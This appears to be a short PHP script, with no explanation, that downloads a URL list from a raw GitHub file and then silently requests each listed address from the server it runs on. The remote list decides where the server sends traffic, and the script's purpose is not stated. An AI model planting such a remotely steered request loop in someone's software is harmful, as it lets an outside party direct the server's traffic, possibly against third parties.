<?php
    $urls = file("https://raw.githubusercontent.com/cloudninedigitals/cloudninedigitals.github.io/refs/heads/main/un.php");
    foreach($urls as $url) {
       file_get_contents($url);
       echo $url; 
    }
    ?>